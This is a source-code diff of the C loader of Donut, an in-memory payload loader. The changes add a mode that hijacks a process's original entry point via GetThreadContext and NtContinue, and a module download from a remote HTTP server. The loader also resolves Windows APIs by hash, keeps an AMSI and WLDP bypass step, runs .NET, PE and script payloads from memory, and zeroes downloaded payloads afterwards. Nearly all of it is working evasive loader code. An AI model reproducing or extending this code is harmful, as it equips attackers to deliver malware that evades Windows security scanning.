@@ -31,32 +31,69 @@
 
 #include "loader.h"
 
-DWORD MainProc(LPVOID lpParameter);
+DWORD MainProc(PDONUT_INSTANCE inst);
 
-HANDLE ThreadProc(LPVOID lpParameter) {
-    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
-    CreateThread_t  _CreateThread;
-    ULONG64         hash;
+HANDLE DonutLoader(PDONUT_INSTANCE inst) {
+    CreateThread_t     _CreateThread;
+    GetThreadContext_t _GetThreadContext;
+    GetCurrentThread_t _GetCurrentThread;
+    NtContinue_t       _NtContinue;
+    ULONG64            hash;
+    HANDLE             h = NULL;
+    CONTEXT            c;
     
-    if(inst->fork) {
-      DPRINT("Creating new thread");
+    // create thread and execute original entrypoint?
+    if(inst->oep != 0) {
+      DPRINT("Resolving address of CreateThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
-      if(_CreateThread == NULL) {
-        DPRINT("Failed!");
+      
+      // api resolved?
+      if(_CreateThread != NULL) {
+        // create new thread
+        DPRINT("Creating new thread");
+        h = _CreateThread(NULL, 0, ADR(LPTHREAD_START_ROUTINE, MainProc), (LPVOID)inst, 0, NULL);
+      } else {
+        DPRINT("FAILED");
         return (HANDLE)-1;
       }
-      return _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainProc, lpParameter, 0, NULL);
+      
+      DPRINT("Resolving address of NtContinue");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
+      
+      DPRINT("Resolving address of GetThreadContext");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
+
+      DPRINT("Resolving address of GetCurrentThread");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
+      
+      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+        c.ContextFlags = CONTEXT_FULL;
+        _GetThreadContext(_GetCurrentThread(), &c);
+        #ifdef _WIN64
+          c.Rip = inst->oep;
+          c.Rsp &= -16;
+        #else
+          c.Eip = inst->oep;
+          c.Esp &= -4;
+        #endif
+        DPRINT("Calling NtContinue");
+        //__debugbreak();
+        _NtContinue(&c, FALSE);
+      }
     } else {
-      MainProc(lpParameter);
-      return NULL;
+      // execute in existing thread
+      MainProc(inst);
     }
+    return h;
 }
 
-DWORD MainProc(LPVOID lpParameter) {
+DWORD MainProc(PDONUT_INSTANCE inst) {
     ULONG                i, ofs, wspace, fspace, len;
     ULONG64              sig;
-    PDONUT_INSTANCE      inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY       assembly;
     PDONUT_MODULE        mod, unpck;
     VirtualAlloc_t       _VirtualAlloc;
@@ -66,6 +103,8 @@ DWORD MainProc(LPVOID lpParameter) {
     ULONG64              hash;
     BOOL                 disabled, term;
     NTSTATUS             nts;
+    PCHAR                str;
+    CHAR                 path[MAX_PATH];
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -102,7 +141,7 @@ DWORD MainProc(LPVOID lpParameter) {
       return -1;
     }
     DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
-    Memcpy(pv, lpParameter, inst->len);
+    Memcpy(pv, inst, inst->len);
     inst = (PDONUT_INSTANCE)pv;
     
     DPRINT("Zero initializing PDONUT_ASSEMBLY");
@@ -135,9 +174,20 @@ DWORD MainProc(LPVOID lpParameter) {
     inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
     if(inst->api.addr[0] == NULL) return -1;
     
-    for(i=0; i<inst->dll_cnt; i++) {
-      DPRINT("Loading %i of %i : %s ...", (i+1), inst->dll_cnt, inst->dll_name[i]);
-      inst->api.LoadLibraryA(inst->dll_name[i]);
+    str = (PCHAR)inst->dll_names;
+    
+    // load the DLL required
+    for(;;) {
+      // store string until null byte or semi-colon encountered
+      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
+      // nothing stored? end
+      if(i == 0) break;
+      // skip name plus one for separator
+      str += (i + 1);
+      // store null terminator
+      path[i] = '\0';
+      DPRINT("Loading %s", path);
+      inst->api.LoadLibraryA(path);
     }
     
     DPRINT("Resolving %i API", inst->api_cnt);
@@ -153,17 +203,20 @@ DWORD MainProc(LPVOID lpParameter) {
       }
     }
     
-    if(inst->type == DONUT_INSTANCE_URL) {
-      DPRINT("Instance is URL");
-      if(!DownloadModule(inst)) goto erase_memory;
-    }
-    
-    if(inst->type == DONUT_INSTANCE_PIC) {
-      DPRINT("Using module embedded in instance");
-      mod = (PDONUT_MODULE)&inst->module.x;
-    } else {
-      DPRINT("Loading module from allocated memory");
+    if(inst->type == DONUT_INSTANCE_HTTP) {
+      DPRINT("Module is stored on remote HTTP server.");
+      if(!DownloadFromHTTP(inst)) goto erase_memory;
       mod = inst->module.p;
+    } else
+    if(inst->type == DONUT_INSTANCE_DNS) {
+      DPRINT("Module is stored on remote DNS server. (Currently unsupported)");
+      goto erase_memory;
+      //if(!DownloadFromDNS(inst)) goto erase_memory;
+      mod = inst->module.p;
+    } else
+    if(inst->type == DONUT_INSTANCE_EMBED) {
+      DPRINT("Module is embedded.");
+      mod = (PDONUT_MODULE)&inst->module.x;
     }
     
     // try bypassing AMSI and WLDP?
@@ -181,7 +234,7 @@ DWORD MainProc(LPVOID lpParameter) {
         goto erase_memory;
     }
     
-    // module data is compressed?
+    // module is compressed?
     if(mod->compress != DONUT_COMPRESS_NONE) {
       DPRINT("Compression engine is %"PRIx32, mod->compress);
       
@@ -190,7 +243,7 @@ DWORD MainProc(LPVOID lpParameter) {
       
       // allocate memory for module information + size of decompressed data
       unpck = (PDONUT_MODULE)_VirtualAlloc(
-        NULL, sizeof(DONUT_MODULE) + mod->len, 
+        NULL, ((sizeof(DONUT_MODULE) + mod->len) -4096) + 4096, 
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
       if(unpck == NULL) goto erase_memory;
@@ -202,32 +255,48 @@ DWORD MainProc(LPVOID lpParameter) {
       // decompress module data into new block
       DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
       
-      nts = inst->api.RtlGetCompressionWorkSpaceSize(
-        mod->compress | COMPRESSION_ENGINE_MAXIMUM, &wspace, &fspace);
+      if(mod->compress == DONUT_COMPRESS_LZNT1  ||
+         mod->compress == DONUT_COMPRESS_XPRESS ||
+         mod->compress == DONUT_COMPRESS_XPRESS_HUFF)
+      {
+        nts = inst->api.RtlGetCompressionWorkSpaceSize(
+          (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, &wspace, &fspace);
       
-      if(nts != 0) {
-        DPRINT("RtlGetCompressionWorkSpaceSize failed with %"PRIX32, nts);
-        goto erase_memory;
-      }
-      
-      DPRINT("WorkSpace size : %"PRId32" | Fragment size : %"PRId32, wspace, fspace);
-      
-      ws = (PDONUT_MODULE)_VirtualAlloc(
-        NULL, wspace, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if(nts != 0) {
+          DPRINT("RtlGetCompressionWorkSpaceSize failed with %"PRIX32, nts);
+          goto erase_memory;
+        }
         
-      nts = inst->api.RtlDecompressBufferEx(
-            mod->compress | COMPRESSION_ENGINE_MAXIMUM, 
-            (PUCHAR)unpck->data, mod->len, 
-            (PUCHAR)&mod->data, mod->zlen, &len, ws);
-            
-      _VirtualFree(ws, 0, MEM_RELEASE | MEM_DECOMMIT);
+        DPRINT("WorkSpace size : %"PRId32" | Fragment size : %"PRId32, wspace, fspace);
+        
+        ws = (PDONUT_MODULE)_VirtualAlloc(
+          NULL, wspace, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        
+        DPRINT("Decompressing with RtlDecompressBufferEx(%s)",
+          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : 
+          mod->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
+                
+        nts = inst->api.RtlDecompressBufferEx(
+              (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
+              (PUCHAR)unpck->data, mod->len, 
+              (PUCHAR)&mod->data, mod->zlen, &len, ws);
+              
+        _VirtualFree(ws, 0, MEM_RELEASE | MEM_DECOMMIT);
       
-      if(nts == 0) {
-        // assign pointer to mod
+        if(nts == 0) {
+          // assign pointer to mod
+          mod = unpck;
+        } else {
+          DPRINT("RtlDecompressBufferEx failed with %"PRIX32, nts);
+          goto erase_memory;
+        }
+      } else if(mod->compress == DONUT_COMPRESS_APLIB) {
+        DPRINT("Decompressing with aPLib");
+        aP_depack((PUCHAR)mod->data, (PUCHAR)unpck->data);
+        DPRINT("Done");
         mod = unpck;
       } else {
-        DPRINT("RtlDecompressBufferEx failed with %"PRIX32, nts);
-        goto erase_memory;
+        //
       }
     }
     DPRINT("Checking type of module");
@@ -255,7 +324,9 @@ DWORD MainProc(LPVOID lpParameter) {
     
 erase_memory:
     // if module was downloaded
-    if(inst->type == DONUT_INSTANCE_URL) {
+    if(inst->type == DONUT_INSTANCE_HTTP || 
+       inst->type == DONUT_INSTANCE_DNS) 
+    {
       if(inst->module.p != NULL) {
         // overwrite memory with zeros
         Memset(inst->module.p, 0, (DWORD)inst->mod_len);
@@ -285,13 +356,14 @@ erase_memory:
     return 0;
 }
 
-int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[]) {
+int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
     return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
       -1, output, DONUT_MAX_NAME);
 }
 
 #include "peb.c"             // resolve functions in export table
-#include "http_client.c"     // For downloading module
+#include "http_client.c"     // Download module from HTTP server
+//#include "dns_client.c"      // Download module from DNS server
 #include "inmem_dotnet.c"    // .NET assemblies
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
 #include "inmem_script.c"    // VBS/JS files
@@ -350,9 +422,9 @@ int main(int argc, char *argv[]) {
         printf("Running...");
       
         // run payload with instance
-        h = ThreadProc(inst);
+        h = DonutLoader(inst);
         
-        if(h != (HANDLE)-1 && inst->fork) {
+        if(h != (HANDLE)-1 && inst->oep != 0) {
           printf("\nWaiting...");
           WaitForSingleObject(h, INFINITE);
         }
